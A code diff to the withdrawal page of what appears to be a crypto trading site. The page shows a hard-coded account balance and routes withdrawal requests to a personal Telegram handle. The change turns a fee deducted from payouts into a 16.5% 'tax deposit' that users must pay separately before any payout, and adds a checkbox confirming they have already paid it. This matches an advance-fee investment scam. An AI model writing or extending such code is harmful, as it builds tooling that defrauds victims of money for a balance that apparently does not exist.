@@ -4,6 +4,7 @@
 import { Card } from "@/components/ui"
 import * as React from "react"
 import Link from "next/link"
+import { WITHDRAWAL_TAX_RATE, withdrawalTax } from "@/lib/trading"
 
 const AVAILABLE_BALANCE = 4250.0
 
@@ -12,24 +13,30 @@ export default function WithdrawPage() {
   const [address, setAddress] = React.useState("")
   const [network, setNetwork] = React.useState("TRC20")
   const [showConfirm, setShowConfirm] = React.useState(false)
+  const [taxAcknowledged, setTaxAcknowledged] = React.useState(false)
 
   const withdrawAmount = amount ? parseFloat(amount) : 0
-  const fee = withdrawAmount * 0.165
-  const receiveAmount = withdrawAmount - fee
+  // The 16.5% tax is settled up front by the client — it is never taken off the
+  // payout, so what they request is exactly what they receive.
+  const tax = withdrawalTax(withdrawAmount)
+  const receiveAmount = withdrawAmount
+  const taxPercent = `${(WITHDRAWAL_TAX_RATE * 100).toFixed(1)}%`
 
   const handleSubmit = () => {
-    const message = `💰 *Withdrawal Request*\n\n*Amount:* $${withdrawAmount}\n*Fee (16.5%):* $${fee.toFixed(2)}\n*Net:* $${receiveAmount.toFixed(2)}\n*Network:* ${network}\n*Address:* ${address}`
+    const message = `💰 *Withdrawal Request*\n\n*Amount:* $${withdrawAmount}\n*Tax deposit (${taxPercent}):* $${tax.toFixed(2)} — settled before payout\n*You receive:* $${receiveAmount.toFixed(2)}\n*Network:* ${network}\n*Address:* ${address}`
     const telegramUrl = `https://t.me/khan_bashiri?text=${encodeURIComponent(message)}`
     window.open(telegramUrl, "_blank")
     setShowConfirm(false)
     setAmount("")
     setAddress("")
+    setTaxAcknowledged(false)
   }
 
   const isValid =
     withdrawAmount >= 50 &&
     withdrawAmount <= AVAILABLE_BALANCE &&
-    address.length > 0
+    address.length > 0 &&
+    taxAcknowledged
 
   return (
     <div className="space-y-4 sm:space-y-6">
@@ -121,9 +128,11 @@ export default function WithdrawPage() {
                   </span>
                 </div>
                 <div className="flex justify-between text-xs sm:text-sm">
-                  <span className="text-muted-foreground">Fee (16.5%)</span>
-                  <span className="font-medium text-muted-foreground">
-                    -${fee.toLocaleString()}
+                  <span className="text-muted-foreground">
+                    Tax deposit ({taxPercent}) — payable first
+                  </span>
+                  <span className="font-medium text-foreground">
+                    ${tax.toLocaleString()}
                   </span>
                 </div>
                 <div className="flex justify-between border-t border-border pt-2 text-xs sm:pt-3 sm:text-sm">
@@ -136,6 +145,21 @@ export default function WithdrawPage() {
                 </div>
               </div>
             )}
+
+            <label className="mb-3 flex cursor-pointer items-start gap-2.5 rounded-lg border border-border p-3 sm:mb-4">
+              <input
+                type="checkbox"
+                checked={taxAcknowledged}
+                onChange={(e) => setTaxAcknowledged(e.target.checked)}
+                className="mt-0.5 h-3.5 w-3.5 shrink-0 accent-[oklch(0.62_0.12_178)]"
+              />
+              <span className="text-[10px] leading-relaxed text-muted-foreground sm:text-xs">
+                I have deposited the {taxPercent} tax
+                {withdrawAmount > 0 ? ` ($${tax.toLocaleString()})` : ""} covering
+                this withdrawal. It is paid separately and is never deducted from
+                the amount I receive.
+              </span>
+            </label>
 
             <button
               onClick={() => isValid && setShowConfirm(true)}
@@ -167,7 +191,8 @@ export default function WithdrawPage() {
             <ul className="space-y-2 text-[10px] text-muted-foreground sm:space-y-3 sm:text-xs">
               {[
                 "Min withdrawal: $50 USDT",
-                "Fee: 16.5% on net",
+                `Tax: ${taxPercent}, deposited before the payout is released`,
+                "You receive the full amount — nothing is deducted",
                 "Processing: 24-48 hours",
               ].map((item, i) => (
                 <li key={i} className="flex items-start gap-2">
@@ -209,10 +234,10 @@ export default function WithdrawPage() {
                 </span>
               </div>
               <div className="flex justify-between border-b border-border py-2">
-                <span className="text-muted-foreground">Fee (16.5%)</span>
                 <span className="text-muted-foreground">
-                  -${fee.toLocaleString()}
+                  Tax ({taxPercent}) — paid separately
                 </span>
+                <span className="text-foreground">${tax.toLocaleString()}</span>
               </div>
               <div className="flex justify-between border-b border-border py-2">
                 <span className="text-muted-foreground">Network</span>
